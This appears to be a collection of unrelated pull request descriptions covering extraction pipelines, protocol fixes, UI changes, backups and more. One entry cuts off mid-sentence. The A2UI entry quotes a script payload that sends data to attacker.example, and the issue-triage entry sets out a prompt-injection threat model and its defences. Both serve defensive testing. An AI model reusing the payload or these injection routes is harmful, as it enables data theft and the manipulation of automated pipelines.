author: tamnd
body:
Milestone 3 of #3.

Norms are nodes, not triples. A statement carries subject, modality, action, object, conditions, exceptions, deadline, and sanction, so the parts of a Vietnamese provision that a triple would flatten survive into the graph intact.

The hard invariants run before any judge does, because a judge call on a statement that cannot possibly be right is wasted money. Evidence quotes must appear byte for byte in the provision text, and the byte offsets are computed here rather than trusted from the model. Class IDs must exist in the cited ontology version. Deontic types must have a bearer, and that bearer's class must actually descend from LegalActor through the parent chain, so a duty borne by a Deadline is rejected before it costs anything. Statement IDs are a hash of the claim, so a re-run never mints a second identity for the same norm.

Verification is candidate blind. The judge sees the source text, the proposed statement, and the ontology definitions for the classes involved, and never the extractor's reasoning. Fast mode runs one extraction and one entailment judge. Slow mode draws independent candidates, unions them by claim so that one candidate's miss is recovered by another, and then requires a second falsification judge to agree. That judge is prompted adversarially with the three named failure modes: negation read backwards, an exception read as the general rule, and scope quietly widened. Only a statement that survives both is verified, and everything else is stored with its verdicts rather than dropped.

The review queue routes what rules say a human should see: confidence below 0.85, any sanction, any exception, and any statement a judge did not fully entail. Queue and decisions are both append only JSONL, so the review history is an audit trail. Build folds jobs, queue, and decisions together and writes the trusted store, reporting what was kept, what is still awaiting a human, and what was dropped.

The projection gains Norm nodes carrying their own provenance, verdict, model, ontology version, and evidence span, plus Condition, Exception, and Sanction nodes and the HAS_NORM, HAS_BEARER, HAS_OBJECT, HAS_LEGAL_BASIS, HAS_CONDITION, HAS_EXCEPTION, HAS_SANCTION edges. Both the CSV bulk import and the incremental Bolt merge carry the full set.

`luatdo prompt --pass norms <provision-id>` prints the exact instructions and input without a model call, which is how the prompts above were checked against real clauses.

Everything is tested with scripted completers: fast mode verified, judge rejection, invalid statement skipping the judges entirely, slow mode union and dual judging, and the malformed JSON correction loop. No network and no credentials in CI.

author: alex-shekhter
body:
Implements **Phase 8** of [RM-AGENT-RELIABILITY](docs/plans/active/RM-AGENT-RELIABILITY/plan.md) — D15's
selection surface. Emit the minimal relevant set of artifacts and of skills deterministically, and
measure what it saves.

## What ships

| Surface | Behaviour |
|---|---|
| `ngrace context --task T-NNN --change C-ID` | Task slice: Purpose, module projections, verification anchors, write scope, exclusions. Read-only |
| `ngrace context --skills [--change C-ID]` | Skill recommendation from cursor state, each candidate carrying its basis |
| Mutual exclusion | Both flags is `invalid-arguments`. No `--compact` — D15 names it as a naming risk |
| Purpose header | Task `Title` plus each `Satisfies` target's `AC-*` body, quoted under a pinned whitespace normalizer. Never a paraphrase |
| Exclusions | `design-context.xml` absolutely, project `.ngrace/context/*` by default, archived siblings, other tasks' bodies — each stated in the output |
| Measurement | `fullBytes`, `selectedBytes`, an enumerated `fullComposition` with per-entry sizes, and `planWave` metrics across a plan's tasks |

Selection, never compression: no model is required and none is used. The slice is composed over
retrieval primitives that already existed — `module show --with-verification`, `module find
--depends-on`, `file show --contracts`.

## The number §4.1 never had

| Measure | Value |
|---|---|
| Per-slice `selectionRatio` | 0.72–0.82 |
| `meanPairwiseOverlapFraction` | 0.917 |
| `sumSelectedBytes` vs `fullBytes` (8-task plan) | 82931 vs 38890 |
| `planUnionSelectionRatio` | 0.617 |

The first line is what this phase would have reported unchallenged. The rest is what makes it honest: an
8-worker wave loads **2.1× the entire unselected envelope**, because two workers on one plan receive
slices that are 92% identical. §8.4 asked for slices that are "per worker, never per plan"; what the
artifact model can deliver is **a plan-level body with a task-shaped header**, since tasks name no
modules and `ObservedWriteScope` is plan-level. That is now emitted as `planWave.honestReading` rather
than left for a reader to discover.

Four measurements are taken against this repository's real tasks, not fixtures. Archived tasks are
permitted subjects when the caller names the change, and every such slice carries `ARCHIVED SUBJECT —
measurement artifact only` so a measurement can never be handed to an executor as live work.

## Review history — five corrections, five sentences

Every correction was about a claim rather than a computation — what the slice *is*, what the skill
surface has *done*, what the denominator can be *checked* against, and what the verdict has *verified*.
The code was right each time. Two are worth naming:

**The per-worker slice was 86–92% shared.** Reported per-slice savings looked strong; the wave cost was
absent. Both numbers now ship together.

**Skill narrowing had never been observed on real state.** Every narrowing result came from a synthetic
cursor in a fixture, while the only live invocation in this repository returned all 16 skills. It now
narrows to 8 of 16 against a real cursor, pinned by a test over the real bundle.

## Known limitations, stated plainly

**§8.5.4 is amended, not satisfied.** Per-worker scope disjointness cannot be verified because the
artifact model has no per-task scope — `ObservedWriteScope` and `DurableScope` are plan-level. Deriving
a narrower scope from `Criterion` prose was rejected: a stage-1 false negative is unrecoverable, so
inventing a scope narrower than the authored one is the worst failure available. Every slice states that
the scope it prints is plan-level and shared with sibling tasks.

**Stage 2 does not exist here.** `selectionStage` reports `toolkit` with a ground string saying that is
the sole value observed and no host adapter exercises a harness stage — a ground declaration, not a
choice among stages.

**The close's verdict is half mechanized, and one half was empty.** Gate permits, no open epoch and the
pattern detectors are real. The scope audit contributed nothing: it reads `git status`, and the workflow
commits before reporting, so it ran over zero files. Two files this branch wrote —
`scripts/release-check.ts` and `src/artifact/scale-ergonomics.test.ts` — are outside `C-SELECTION`'s
declared `ObservedWriteScope` and went unreported. Both writes were legitimate; the audit was never in a
position to say so.

## Scheduled, not fixed

`C-OBSERVABLE-CHECKS` ships as a **draft spec** carrying three items of one shape — a green result from
a check never in a position to be red:

- `src/gates` and `src/review` are missing from `package.json#files`, so `validate:packed` is red and
  the packed CLI fails at import; `validate:packed` is not in `validate:ci`, which is why five merged
  PRs did not notice.
- The scope audit sees only uncommitted work.
- Archived bundles resolve to no plan, and the audit is skipped in silence.

No user is affected — published `@neograce/cli@6.0.1` predates both directories — and `prepublishOnly`
correctly blocks a publish. These are inherited from Phases 5 and 6 and get their own PR.

## Verification

```
bun test                     → 901 pass / 3 skip / 0 fail
bun run validate:ci          → exit 0
bun run ngrace lint --path . → 0 errors
```

`C-SELECTION` is archived at `spec=applied plan=applied`.

author: csinva
body:
Fixes #202

## Problem

```
InvalidModelError: Model type not yet supported by TreeExplainer:
<class 'imodels.tree.hierarchical_shrinkage.HSTreeClassifier'>
```

`shap.TreeExplainer` dispatches on the model class, so it doesn't recognize the imodels wrapper — and there was nothing in the docs saying what to do instead.

## Answer

Pass the estimator the wrapper holds. Shrinkage rewrites that tree's node values **in place**, so the explainer sees the shrunk model:

```python
explainer = shap.TreeExplainer(model.estimator_)   # not model itself
shap_values = explainer.shap_values(X)
```

I verified this is genuinely explaining the shrunk model rather than the original tree:

- SHAP values differ from the unshrunk tree's (mean |shap| 0.139 → 0.100, consistent with shrinkage pulling leaf values toward their ancestors)
- Additivity holds against the wrapper: `shap_values.sum(axis=1) + expected_value == model.predict_proba(X)[:, 1]`

That's what the SHAP summary plots in [the paper](https://arxiv.org/abs/2202.00858) (Figure 6) need.

## Changes

- A readme section under the model tables
- `tests/shap_test.py` pinning the behaviour: the wrapper is rejected, the wrapped estimator works, values reflect shrinkage, and additivity holds

shap is **not** added as a dependency — the test `importorskip`s it.

## Note

I considered making `HSTreeClassifier` itself acceptable to `TreeExplainer`, but that would mean either subclassing sklearn's tree classes or patching shap's dispatch table — both fragile against shap's internals. Pointing at `.estimator_` is the stable answer, and now it's documented.

author: soundmatt
body:
## Summary

The entire conditional-request feature area (TC18 §11.2.2/§11.2.3 —
compound, compound-wait, triggered, chained, timed, cancellation) was
broken at **two independent levels**. Fixing it properly required both.

**Layer 1: the wire sub-field encodings were non-conformant.**
**Layer 2: none of these request kinds were wired into dispatch at all.**

This is a breaking wire-format *and* API change.

---

## Layer 1 — wire sub-field encodings

Every conditional request kind carries its own sub-fields in the eight
octets of an ACF_GBB's repurposed `message_timestamp` region. Every one
had them at the wrong offset, the wrong width, or missing entirely.

### How this was verified against primary source

Each layout was re-derived from the specification PDF directly — the
paginated figures were rendered at 200 dpi and read visually, not taken
from any prior summary or from the existing code:

| Kind | Spec reference |
|---|---|
| Compound | §11.2.2.1, Figure 8 / Table 6 (p. 25–26) |
| Compound-wait | §11.2.2.2, Figure 9 / Table 7 (p. 27–28) |
| Triggered | §11.2.2.3, Figure 10 / Table 8 (p. 29–30) |
| Chained | §11.2.2.4, Figure 11 / Table 9 (p. 31–32) |
| Timed | §11.2.2.5, Figure 12 / Table 10 (p. 33) |
| Clear-single | §11.2.3.3, Figure 15 / Table 13 (p. 37) |

Each figure lays the region out as a 32-bit-wide table over two quadlet
rows; column spans give the field widths, which is what the visual render
was needed to confirm (the text extraction preserves field *order* but
not width).

### The fixes

| Request kind | Was | Now |
|---|---|---|
| Compound / compound-wait `0x0F`/`0x8F`, `0x0B`/`0x8B` | 16-bit `sequencer` at offset 1, pushing `start_state`/`next_state` two octets late; 8-bit repetitions with an `0xFF` infinite sentinel | offsets 1..7 = `start_state`(1) `next_state`(1) `sequencer`(1) `exec_delay`(2) `repetitions`(2); infinite sentinel `0xFFFF` |
| Triggered `0x0E`/`0x8E` | compound's `sequencer`/`start_state`/`next_state` — **no trigger-selection fields at all** | `trigger_source_ep`(1) `trigger_signal_nr`(1) `trigger_threshold`(1) `exec_delay`(2) `repetitions`(2) |
| Timed `0x0A` | 32-bit value at offset 1, overwriting the reserved octet | reserved-zero octet at offset 1; 48-bit big-endian `presentation_time` at offsets 2..7 |
| Chained `0x01` | invented `chain_length`/`chain_position` over reserved octets; no `chain_exec_delay` | `chain_exec_delay`(2) at offsets 4..5; offsets 1..3 and 6..7 reserved-zero |
| Clear-single `0x07` | `clear_transaction_num` at offset 1 | `clear_transaction_num` at offset 3 |

Triggered was the largest single change: the trigger-*selection*
mechanism was entirely absent, so a triggered request had no way to
express which trigger it was waiting on, and `rcp_triggered_tick()`
gated on a sequencer state that a triggered request does not have.

Reserved octets are now **enforced on decode**, not merely written as
zero — `RCP_TIMED_ERR_RESERVED_NONZERO`,
`RCP_CHAINED_ERR_RESERVED_NONZERO`, `RCP_CANCEL_ERR_RESERVED_NONZERO`.
Timed additionally rejects a set `hs`/`cs`
(`RCP_TIMED_ERR_UNSUPPORTED_CMD`, Table 10).

### Two behavioral rules that were wrong, not merely absent

- **Chained `cs`** is a *conditional start* selector (Table 9): it is
  read on the member **about to run**, about its **predecessor's**
  outcome. `rcp_chained_advance()` read it off the member that *errored*
  — inverting who controls the abort, so a failing member could veto its
  successors instead of each successor deciding for itself.
- **Compound's sequencer sentinels** (§11.2.2.1/.2) were unimplemented:
  `start_state == 0` ("start in any state") never started, and
  `next_state == 0` ("remain in the current state") drove the sequencer
  to state 0.

---

## Layer 2 — dispatch integration (the architectural change)

`rcp_compound_tick()`, `rcp_compound_wait_tick()`,
`rcp_triggered_tick()`, `rcp_chained_advance()`, `rcp_timed_admit()` and
`rcp_cancel_attempt()` had **zero callers** outside their own modules and
unit tests. `src/mock.c`'s dispatcher never looked at `request_type` and
treated every ACF message identically. `rcp_sched_compare()`'s priority
ordering and `rcp_e2e_request_may_execute()`'s safety gate were both
individually correct, individually tested, and **never invoked**. Real
dispatch was unconditional FIFO; only standard requests worked end to end.

### Design

`server.h`/`server.c` gains a per-endpoint **request store** alongside
the existing `ep_enable` pre-load queue. Three functions join everything
up:

1. **`rcp_server_endpoint_admit()`** — peeks `request_type`, classifies
   via `rcp_sched_classify()`, and routes:
   - *standard* (or an unrecognized opcode, which fails safe to standard)
     → the original `rcp_server_endpoint_submit()` path, **byte for byte
     unchanged**, reporting `EXECUTE_NOW`/`QUEUED`;
   - *conditional* → decoded through its own module's `decode_*` and
     stored (owning a byte copy of the frame) → `PENDING`;
   - *cancellation* → `CANCELLATION`, for the caller to apply;
   - undecodable, or store full → `REJECTED`.

2. **`rcp_server_endpoint_select_due()`** — arms each stored request's
   `exec_delay` timer when its own start condition first holds, then
   evaluates it through that kind's own predicate
   (`rcp_compound_start_condition_met()` / `rcp_timed_due()` /
   `rcp_triggered_threshold_reached()` / `rcp_chained_exec_delay_elapsed()`
   …), applies **`rcp_e2e_request_may_execute()`** so safety-tagged
   (`0x8x`) requests stay queued until the endpoint reaches its safe
   state, and returns the single highest-priority due request per
   **`rcp_sched_compare()`** — rank first, arrival order within a rank.

3. **`rcp_server_endpoint_complete()`** — applies the completion action
   (`rcp_compound_tick()` / `rcp_compound_wait_tick()`, both of which
   decline to advance a sequencer that has left `start_state`), then the
   **repetition rule**: infinite sentinel is never decremented, zero
   removes the request, anything else decrements and re-arms.

Plus `rcp_server_endpoint_notify_trigger()`,
`rcp_server_endpoint_chain_predecessor_done()`, the three
`cancel_*` functions and `rcp_server_endpoint_watchdog_purge()` (which
is `rcp_e2e_watchdog_purge_should_keep()` applied to the store, so only
the safety sequence survives a watchdog overflow).

`mock.c` drives all of it: `rcp_mock_server_tick()`,
`rcp_mock_server_notify_trigger()` (server-wide — a triggered request on
one endpoint routinely waits on *another* endpoint's signal, which is
exactly what `trigger_source_ep` names),
`rcp_mock_server_set_sequencer_count()`/`_sequencers()` (the sequencer
table is a server register, so the server owns it and `tick()`
overwrites any caller-supplied pointer), `rcp_mock_server_watchdog_purge()`,
and chain sequencing across a frame's members in
`rcp_mock_server_dispatch_frame()` — chain membership is *positional*
(consecutive members of one AVTPDU), so it must be decided where frame
order is known, not inside a per-endpoint store.

### Still open — deliberately out of scope

`src/mock.c`'s dispatcher still has **no `ep_type` switch and never
calls into any `ep_*.h` module's own decode function for *standard*
requests either** — it invokes only the caller-supplied handler. This PR
makes conditional requests reach dispatch correctly; it does **not**
make the reference server decode endpoint-specific payloads itself.
Please don't read this PR as "dispatch is now fixed" — it fixes the
conditional-request slice of it.

---

## Testing

**New `tests/test_conditional_dispatch.c` (22 cases)** — the first test
in this repo to exercise these kinds through the real
`rcp_mock_server_dispatch()`/`_tick()` path rather than each module's
encode/decode in isolation. It asserts on **what the endpoint handler
actually saw and when**, so a request that is stored but never executes,
executes with its condition unmet, or executes in the wrong order fails.
Covers: standard requests unchanged; compound waiting on its sequ

### Motivation

- Improve the settings UI so changes to the organization or form context take effect immediately and avoid confusion about whether a selection has been applied.
- Prevent submitting a stale `formCode` when switching organizations so the controller can load its default form for the newly selected organization.

### Description

- Add `initializeSettingsContext` to `src/Clc.PatronRegistration.Web/wwwroot/js/settings.js` which attaches `change` listeners to `#organization-scope` and `#form-code-scope`, calls `requestSubmit()`, and temporarily disables `#form-code-scope` for organization changes so `formCode` is omitted from the GET request.
- Export the new initializer via `globalThis.SettingsEditSessions` and call it for the page-scoped form element `.settings-context` so initialization does not auto-submit on page load.
- Replace the visible `View settings` submit button in `src/Clc.PatronRegistration.Web/Views/Settings/Index.cshtml` with a `<noscript>` fallback button so the action remains available only when JavaScript is disabled.
- Update help copy in `src/Clc.PatronRegistration.Web/Views/Settings/Help.cshtml` to explain that selections load automatically rather than requiring an explicit button press.
- Add focused JavaScript tests in `src/Clc.PatronRegistration.Web.Tests/JavaScript/settings-edit-session.test.mjs` to verify initialization does not submit, organization changes omit `formCode`, form changes include both values, and the `View settings` button exists only inside `<noscript>`.

### Testing

- Ran `node --check src/Clc.PatronRegistration.Web/wwwroot/js/settings.js` and it succeeded.

author: dwu96
body:
## Problem

New issues arrive with no labels unless the person filing one remembers to pick
them, and most don't. An unlabelled issue is invisible to every `area:`-scoped
query a maintainer runs, so it sits in the undifferentiated backlog until
somebody reads the whole list by hand.

## Why it matters

Labels are how work reaches the person who owns that surface. `area: cron` and
`area: dashboard` have different owners; an unlabelled cron bug is not routed to
anyone. The cost falls hardest on first-time reporters, whose issues are the
ones least likely to be labelled and least likely to be found again.

## Fix (symptom → root cause → change)

The symptom is unlabelled issues. The root cause is that nothing assigns labels
at creation time — the repository has a well-developed label taxonomy (6 type
labels, 11 `area:` labels, 3 `platform:` labels) and no automation that applies
it. Path-based labelling (`actions/labeler`) cannot help: an issue has no
changed files, and keyword rules get `area:` wrong often enough to be worse than
no label, because a wrong `area:` routes the issue to the wrong owner and is
rarely revisited.

So this adds `.github/workflows/issue-triage.yml`: on `issues: opened`, one
Amazon Bedrock `converse` call classifies the issue and the matching labels are
applied. It is modelled directly on `ship-report.yml` — same
`aws bedrock-runtime converse` invocation, same whitespace-separated model
priority chain, same `continue-on-error` + fallback shape.

**The model is not trusted, and does not need to be.** Issue text is written by
anyone, so the blast radius is bounded structurally rather than by prompt
wording:

- **No tools, no credentials.** This is a single `converse` call — text in, text
  out. The model cannot read the repo, call the GitHub API, or run a command, so
  an injection has nothing to reach for. (Contrast the agentic PR reviewers,
  which get a checkout and therefore need much larger guard rails.)
- **Allowlist by construction, not a denylist.** The selectable set is (a fixed
  list of type labels) + (live `area:` labels) + (live `platform:` labels), and
  the model's verdict is intersected against it in a second pass. Process labels
  — `readiness: *`, `release-blocker`, `defer-longterm`, `blocked`, `wontfix` —
  are in none of those buckets, so no model output can select them. Reading the
  `area:`/`platform:` labels live means new ones are picked up with no edit here.
- **Untrusted text never reaches the shell.** Title and body are fetched with
  `gh api` and handed to `jq` via `--rawfile`; nothing is interpolated into a
  `run:` block through `${{ }}`.
- **Model prose is not echoed to the issue.** The `reason` goes to the job
  summary only, so an injected payload has no audience it could steer, and
  nothing this workflow writes can enter a later agentic reviewer's context.

Worst case for a successful injection is one mislabelled issue.

Two behaviours worth calling out:

- **Already-triaged issues are left alone.** Only dimensions with no existing
  label are filled, so an issue that arrived from the dashboard's "Request a
  Feature" flow (which attaches labels itself) is not re-decided. Labels are
  never removed.
- **Classification failures apply nothing and exit 0** — missing secret, OIDC
  or Bedrock failure, unparseable verdict. A missing label is harmless; a wrong
  label is noise. Infrastructure failures (the GitHub API calls) deliberately do
  go red, because a wrong permission set is a defect in this workflow rather
  than "nothing to triage".

`on: issues` runs only the default-branch copy of a workflow, so this cannot be
exercised from this branch. A `workflow_dispatch` entry point (issue number +
`dry_run`, defaulting to true) exists to rehearse against a real issue after
merge; it reports the verdict in the job summary and touches no labels.

## Tests

`test/test_issue_triage_workflow.py` — 22 tests. They extract the workflow's own
`run:` scripts and execute them for real with `gh` and `aws` replaced by stubs,
so what is tested is the shipped script rather than a reimplementation that
could drift. What they lock in:

- **Allowlist integrity** — a verdict naming `release-blocker`,
  `readiness: passed`, `defer-longterm` and `wontfix` applies nothing; labels
  are siloed per dimension, so a type label smuggled into `areas` is rejected.
- **No forged log commands** — a newline inside a model-chosen name must not
  start a line the runner parses as a `::workflow command::`.
- **Dimension logic** — a fully labelled issue is skipped before the model runs;
  an issue with only an `area:` label keeps it and gains only a type.
- **Graceful degradation** — missing role secret, Bedrock failure, prose instead
  of JSON, empty output, a non-object, and wrong JSON types for every field all
  apply nothing and exit 0.
- **Input handling** — fenced JSON is parsed; areas cap at 2 in the model's
  preference order; a multibyte CJK body is truncated by codepoint, not by byte;
  a PR number is skipped; a non-numeric `workflow_dispatch` input is rejected.

Two of these tests exist because they caught real bugs during development: a jq
`select([...] | index(.))` where `.` rebound to the array, making the allowlist
unconditionally truthy, and alphabetical `unique` discarding the model's
preference order when capping to two areas. Both are verified to fail against
the pre-fix workflow.

The module skips where the POSIX toolchain it drives is unavailable, including
the Windows leg of the matrix, matching the guard in
`test/test_ai_review_workflows.py`.

## Manual verification

### Component Added
- **Kanban** (`source="custom"`): Represents multi-column stage/board layouts (e.g. learning roadmaps, project task columns) with typed properties (`title`: text, `columns`: binding).
- **Interface Using It**: Turn 1 of the AI Learning Assistant renders a `Kanban` board of study stages (`Foundations`, `Core Models`, `Advanced Deployment`) bound to `/kanban_columns`.

### Application Summary
- **Domain**: AI & Machine Learning Tutor ("Teach me Machine Learning and System Design").
- **Behavior**: Every turn responds strictly as a composed, catalog-validated A2UI interface (0 raw text paragraphs). Tapping any action button emits a named event (`request_data`) which feeds the next turn.

### 3-Turn Demonstration
1. **Turn 1 Prompt**: `"Teach me Machine Learning and System Design."`
   - **Composed Interface**: `Text` (heading) + `Text` (intro) + `Kanban` (roadmap columns) + `Row` of `Button` choices (`"Machine Learning Track"`, `"System Design Track"`).
2. **Turn 2 Prompt**: `"Machine Learning Track"`
   - **Composed Interface**: `Text` (heading) + `BarChart` (topic weights %) + `DataTable` (modules & hours) + `ProgressBar` (25% track progress) + `Button` (`"Start Neural Networks Module"`).
3. **Turn 3 Prompt**: `"Start Neural Networks Module"`
   - **Composed Interface**: `Text` (heading) + `Notice` (key concept: backprop chain rule) + `Timeline` (concept progression sequence) + `Button` (`"Take Neural Networks Quiz"`).

### Adversarial Prompt & Validator Rejection
- **Poisoned Payload**: Injected `RawHtml` component (`<script>fetch('http://attacker.example/steal')</script>`) and an unregistered action (`drop_database_tables`).
- **Validator Rejection**:
  - `REJECTED: Invariant='catalog', Field='type', Reason='unknown component type 'RawHtml''`
  - `REJECTED: Invariant='event', Field='onPress', Reason='unregistered action 'drop_database_tables''`
- **Safety**: Unapproved nodes were stripped; safe components (`Column`, `Text`) rendered cleanly with 0 executable script execution.

### Honest Verdict & Trade-offs
- **Where Composing at Runtime Won**: High dynamic flexibility across topics — the system generated distinct rich widgets (Kanban, BarChart, DataTable, Timeline) tailored to the user's intent without needing hardcoded screen templates for every track.
- **Where it Fell Short**: Latency is higher than static views due to generative composition calls; interface arrangement varies slightly across turns, requiring predictable component ordering to maintain user spatial familiarity.

author: devin-ai-integration[bot]
body:
## Summary

StreamWeaver's `!gamble`/`!roll`/`!double` read the canonical SPMT balance but wrote the result back with `POST /api/points/set`, which only touches DSH's legacy leaderboard — so wins and losses drifted away from the wallet `!points` reports, and a jackpot would have inflated lifetime XP by the full payout.

Adds `POST /api/points/gamble-settle`, a thin pass-through to spmt-live's `xp/gamble-settle` (spmt-live#13) that applies the ceiling rules server-side: the stake leaves spendable XP, a win refills spendable up to lifetime, and any overflow is compressed 10:1 and split before it can raise the rank.

```
{ userId, wager, payout, idempotencyKey } -> { currentPoints, lifetimePoints, rank, duplicate, source }
```

Callers pass the wager and the *gross* payout (stake + profit), not a new total, so the settlement is replay-safe: `idempotencyKey` is required and a retry returns `duplicate: true` without paying twice. When SPMT is unconfigured or the user has no linked identity it falls back to `current - wager + payout` on the legacy leaderboard and reports `source: 'legacy'`, matching the fallback the balance/leaderboard routes already use.

Verified with `npm run typecheck`.

This pull request implements a highly robust, zero-trust security enhancement called the State Restoration Deep Schema & Structural Sanitization Shield (SRD-SSS) within VORO's data orchestration layers. 

### Attack Vectors Mitigated:
1. **Nested Prototype Pollution**: Prevents malicious payloads from exploiting nested object restoration paths to inject properties like `__proto__`, `constructor`, or `prototype`.
2. **Denial of Service (DoS) / Heap Exhaustion**: Enforces strict structural boundaries on imported JSON (max nested object depth of 6, maximum array lengths of 1,000, and maximum string values of 10,000 characters) to prevent browser thread blocking, memory bloat, and parser starvation.
3. **Type Confusion / State Hijacking**: Compares restored state keys against a strict type schema mapping to guarantee type-conformity (e.g., verifying lists are arrays and configs are objects).
4. **Persistent DOM XSS (XSS-on-Restore)**: Recursively scrubs all leaf string values inside imported records using our secure native-HTML sanitization pipeline.

## 🚀 작업 내용

동아리 소개 작성 화면에서 리치 에디터의 링크 버튼을 누르면 런타임 에러가 나는 문제를 고쳤습니다. 원인은 링크 URL을 `window.prompt` 로 받던 부분인데, prompt 는 Electron/webview 계열 임베디드 브라우저에서 지원되지 않아 그대로 throw 합니다. 이 에디터는 동아리 소개뿐 아니라 동아리 공지 모달·총동연 공지 작성까지 세 화면이 공유하므로, prompt 를 없애고 툴바 아래 인라인 URL 입력 행(열기 → 적용/제거, Escape 로 닫기)으로 교체해 세 곳을 한 번에 해결했습니다.

## 🤔 고민했던 내용

동아리 소개에서 링크 기능 자체를 빼는 선택지도 있었지만, 같은 크래시가 공지 에디터에도 그대로 남고 소개글에도 홈페이지·신청 폼 링크 수요가 자연스러워 원인 교체 쪽을 택했습니다. 기존 prompt 의 동작 계약(취소 → 무동작, 빈 값 적용 → 링크 해제, 기존 링크 위에서 열면 현재 URL 시드)은 그대로 유지했습니다. 리뷰 과정에서 두 가지를 추가로 보강했습니다 — 공지 모달이 document 레벨 Escape 로 닫히는 구조라 링크 입력의 Escape 전파를 끊지 않으면 작성 중인 초안째 모달이 닫히는 문제, 그리고 한글 IME 조합 확정 Enter(keyCode 229)가 미완성 URL 을 적용해버리는 문제입니다.

## 💬 리뷰 중점사항

에디터가 form 안에 놓이는 소비처가 있어 Enter 의 암묵 submit 차단과 버튼 type="button" 지정을 확인해 주세요. 툴바 → 입력으로 포커스가 이동해도 에디터 선택 영역이 유지되어 적용 시 올바른 범위에 링크가 걸리는지(테스트로 커버)와, Escape 전파 차단·IME 가드 테스트가 의도를 제대로 고정하는지 봐주시면 좋겠습니다.

body:
## What

The reconnect sweep issued a refresh **per stale key**. It now collects the keys it decided to refresh and hands them to `startBatch` — the transport `getAll` already uses — so a batch-fetcher store sends **one** call for the whole screen.

This closes the last part of the roadmap's `revalidateActive` item, after per-stream `maxAge` (#83), batched reads (#84) and the force knob (#85).

## Why it was N calls before

The per-key `refresh()` calls were merged only by the coalescing accumulator, which exists solely when a plain `batchFetcher` is paired with a positive `coalesceWindow`. `conditionalBatchFetcher` and a **window-less** `batchFetcher` both stayed N calls — a store could be fully batch-capable and still fan out on reconnect.

## Why the diff is small

Routing rather than reinventing, exactly as the roadmap called for. The per-key slices `startBatch` creates are ordinary `refreshWith` registrations, so single-flight, epoch fencing and per-key `AquiferEvents` are preserved *by construction* rather than by re-implementation, and a key already in flight joins that fetch instead of being re-requested. Suppressed/fresh/`CacheOnly`-only keys are filtered before the call, so they are never in it.

## Two limits, stated rather than implied

- **A single-key `fetcher`/`conditionalFetcher` store still issues one fetch per stale key**, and always will — there is no multi-key transport to use. `startBatch` falls back to precisely the loop this replaced, so that path is unchanged.
- **A coalescing store now dispatches immediately** instead of feeding the accumulator and waiting out its window. That matches what `getAll` already did with its own keys, but it is a real behaviour change and is called out in the changelog.

It also took most of the sweep's *validator* reads with it, though not the way the roadmap predicted: `runBatch` gathers validators through its own single `loadAll`, so a `conditionalBatchFetcher` sweep reads once for the whole set. The single-key `conditionalFetcher` case still reads per key — the store that cannot batch its fetches cannot batch these either.

## Verification

- **Three new tests**, and I confirmed the two batching ones fail against the old per-key path (2 of 26 fail, the right two):
  - `the sweep fetches every stale key in one batch call` — asserts the batch's *contents*, not just a count.
  - `the sweep still fetches per key when no batch fetcher is configured` — pins the fallback.
  - `a suppressed key is left out of the sweep's batch` — pins that suppression survives batching.
- `./gradlew :aquifer-core:build :aquifer-test:build :aquifer-persistence-file:build :aquifer-persistence-sqldelight:build :aquifer-okhttp:build :sample:build` green, detekt and `apiCheck` included.
- **`:aquifer-core:lincheckTest` green** (10m26s locally).
- No public signature changed, so no `apiDump`.

**Worth knowing:** the suppression test failed twice before it was right, and both times *the test* was wrong — first I advanced the clock past the negative-cache TTL so the key had legitimately become eligible again, then I over-corrected to a window exceeding `negativeCache.maxTimeToLive`. The implementation was correct throughout.

## Test-class split

`RevalidateTest` tripped detekt's `LargeClass` at 26 tests. I split it along its seams — `RevalidateForceTest`, `RevalidateBatchingTest` — rather than taking a `@Suppress`, per CONTRIBUTING's "prefer fixing findings". Counts confirm all 26 still run (17 / 5 / 4). That split is most of the line count in this diff.

README, `CHANGELOG.md` and the roadmap item are updated here; the item is now closed and moved to the end of its milestone per the file's ordering rule.

# תיאור

שני דברים:

1. **עותק חיצוני של הגיבויים ב-R2** — הדיסק של Render מגן מפני טעות במסד, לא מפני אובדן השירות עצמו.

## סוג השינוי

- [ ] תיקון באג
- [x] פיצ'ר חדש
- [ ] שינוי שובר תאימות (Breaking change)
- [x] תיעוד / ריפקטור / תחזוקה

## תוכנית

הוצגה ואושרה לפני המימוש. ההכרעה המרכזית: **באקט R2 נפרד ופרטי**, ולא שימוש חוזר בבאקט הקבצים המצורפים.

## שינויים עיקריים

### עותק חיצוני ב-R2
- כשל בהעלאה **לא** מפיל את הגיבוי — הקובץ המקומי תקין — אבל נרשם ב-`r2_uploaded`/`r2_error` ומוצג במסך הניהול לצד סטטוס הריצה.
- הבאקט חייב להיות מוגדר במפורש ב-`BACKUP_R2_BUCKET`, ולא נופל בברירת מחדל לבאקט הקבצים המצורפים — שהוא ציבורי, ושם גיבוי היה חושף את כל המסד למי שמנחש שם קובץ.
- הרוטציה מוחקת רק אובייקטים ששם הקובץ שלהם תואם את פורמט הגיבוי, לפי `LastModified` ולא לפי השם, ורק אחרי העלאה מוצלחת.
- `r2.py`: הבדיקה "R2 מוגדר" פוצלה ל-`_has_credentials` (אישורי גישה) מול `_is_configured` (כולל `R2_PUBLIC_URL`, נדרש רק כשמחזירים URL ציבורי) — בלי הפיצול, היעדר `R2_PUBLIC_URL` היה חוסם את פתיחת הלקוח גם לבאקט פרטי. נוספו `upload_file` (streaming מהדיסק דרך multipart, במקום לטעון את ה-zip לזיכרון), `list_objects` ו-bucket אופציונלי ל-`delete_object`.
- `duration_seconds` נמדד עכשיו בסוף הריצה, כך שההעלאה נכללת בו.

### תיעוד
- `README.md`, `.env.example`, `render.yaml` — משתני הסביבה החדשים.
- `docs/backup-restore-guide.md` — המדריך המלא, כולל סעיף על העותק החיצוני ו"מה חסר" עם הפערים שנותרו (retention הוא עותק ולא ארכיון, אין ניטור אקטיבי).
- הוסרה שורת `MONGODUMP_PATH` מטבלת משתני הסביבה ב-README — המשתנה לא קיים ב-`Settings` מאז המעבר למימוש Python נטו.

## בדיקות

אין תשתית טסטים בריפו, ולכן נכתבו בדיקות חד-פעמיות שהורצו מקומית (לא נוספו לריפו). כולן הורצו מחדש אחרי הסרת שינוי השם.

- [x] בדיקה ידנית של הזרימה הראשית
- [x] בדיקת מקרי קצה

